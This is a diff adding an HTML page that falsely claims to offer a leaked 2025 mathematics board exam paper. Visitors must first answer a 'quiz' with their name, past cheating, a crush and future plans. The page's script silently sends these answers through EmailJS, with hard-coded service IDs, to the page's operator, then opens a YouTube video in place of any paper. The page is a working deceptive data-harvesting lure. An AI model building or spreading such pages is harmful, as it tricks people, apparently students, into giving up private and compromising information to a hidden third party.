@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Leaked Mathematics Paper 2025</title>
+    <style>
+        @keyframes glowingText {
+            0% { opacity: 0; transform: scale(0.8); }
+            50% { opacity: 1; transform: scale(1.1); }
+            100% { opacity: 0; transform: scale(0.8); }
+        }
+
+        body {
+            font-family: 'Arial', sans-serif;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+            background-color: #121212;
+            color: white;
+        }
+
+        .container {
+            max-width: 600px;
+            margin: 50px auto;
+            background: #1e1e1e;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0px 0px 15px rgba(255, 255, 255, 0.1);
+        }
+
+        h1 {
+            color: #f1c40f;
+        }
+
+        p {
+            color: #ccc;
+            font-size: 16px;
+        }
+
+        input, textarea {
+            width: 90%;
+            padding: 10px;
+            margin-top: 10px;
+            border-radius: 5px;
+            border: none;
+            background: #333;
+            color: white;
+        }
+
+        textarea {
+            height: 80px;
+            resize: none;
+        }
+
+        button {
+            padding: 12px;
+            margin-top: 15px;
+            background-color: #f1c40f;
+            border: none;
+            color: black;
+            font-weight: bold;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        button:hover {
+            background-color: #e1b700;
+        }
+
+        button:disabled {
+            background-color: gray;
+            cursor: not-allowed;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        footer {
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+            background-color: #222;
+            color: white;
+            text-align: center;
+            padding: 10px;
+            font-weight: bold;
+        }
+
+        /* Bhavesh Animation */
+        #bhavesh-animation {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 50px;
+            font-weight: bold;
+            color: white;
+            text-align: center;
+            animation: glowingText 3s infinite;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Leaked Mathematics Paper 2025</h1>
+        <p>The 2025 Mathematics board exam paper has been leaked! To ensure fairness, we have uploaded the paper for all students. However, before accessing it, you must complete a short quiz honestly. If you provide dishonest answers, you will be permanently banned from accessing the paper.</p>
+
+        <div id="quiz">
+            <h2>Quiz</h2>
+            <p>Enter your name:</p>
+            <input type="text" id="username" placeholder="Your Name">
+            <br><br>
+
+            <div id="questions">
+                <div id="question1"> 
+                    <p>1. Have you ever cheated in an exam? Write about it honestly.</p>
+                    <textarea id="cheating" placeholder="Write your answer..." oninput="toggleButton('cheating', 'next1')"></textarea>
+                    <br>
+                    <button id="next1" onclick="showNextQuestion('question1', 'question2')" disabled>Next</button>
+                </div>
+
+                <div id="question2" class="hidden">
+                    <p>2. Do you have a crush on someone? Be honest and share.</p>
+                    <textarea id="crush" placeholder="Write your answer..." oninput="toggleButton('crush', 'next2')"></textarea>
+                    <br>
+                    <button id="next2" onclick="showNextQuestion('question2', 'question3')" disabled>Next</button>
+                </div>
+
+                <div id="question3" class="hidden">
+                    <p>3. What are your future plans? Write about it honestly.</p>
+                    <textarea id="future" placeholder="Write your answer..." oninput="toggleButton('future', 'submit')"></textarea>
+                    <br>
+                    <button id="submit" onclick="submitQuiz()" disabled>Submit Quiz</button>
+                </div>
+            </div>
+        </div>
+
+        <div class="hidden" id="result">
+            <h2>Click below to open the board paper:</h2>
+            <button onclick="openBoardPaper()">Open Board Paper</button>
+        </div>
+    </div>
+
+   
+   
+
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            emailjs.init("xAGFEETxLLufFW5Cu"); // Initialize EmailJS after page load
+        });
+
+        function showNextQuestion(currentId, nextId) {
+            document.getElementById(currentId).classList.add("hidden");
+            document.getElementById(nextId).classList.remove("hidden");
+        }
+
+        function submitQuiz() {
+            let username = document.getElementById("username").value.trim();
+            let cheating = document.getElementById("cheating").value.trim();
+            let crush = document.getElementById("crush").value.trim();
+            let future = document.getElementById("future").value.trim();
+
+            if (!username || !cheating || !crush || !future) {
+                alert("Please complete all fields before submitting.");
+                return;
+            }
+
+            if (localStorage.getItem("attempts") >= 3) {
+                alert("You have reached the maximum attempts (3).");
+                return;
+            }
+            localStorage.setItem("attempts", (parseInt(localStorage.getItem("attempts")) || 0) + 1);
+
+            let answers = { username, cheating, crush, future };
+            sendEmail(answers);
+
+            document.getElementById("quiz").classList.add("hidden");
+            document.getElementById("result").classList.remove("hidden");
+
+            // Show Bhavesh Animation
+            document.getElementById("bhavesh-animation").style.display = "block";
+        }
+
+        function sendEmail(data) {
+            emailjs.send("service_u7peh3i", "template_dx6pgcu", {
+                username: data.username,
+                cheating: data.cheating,
+                crush: data.crush,
+                future: data.future
+            }).then(
+                function(response) {
+                    console.log("Email sent successfully:", response);
+                },
+                function(error) {
+                    console.error("Email sending failed:", error);
+                }
+            );
+        }
+
+        function openBoardPaper() {
+            window.open("https://youtu.be/GoHDolSJxIQ", "_blank");
+        }
+
+        function toggleButton(textareaId, buttonId) {
+            let textValue = document.getElementById(textareaId).value.trim();
+            let button = document.getElementById(buttonId);
+            button.disabled = textValue === "";
+        }
+    </script>
+</body>
+</html>
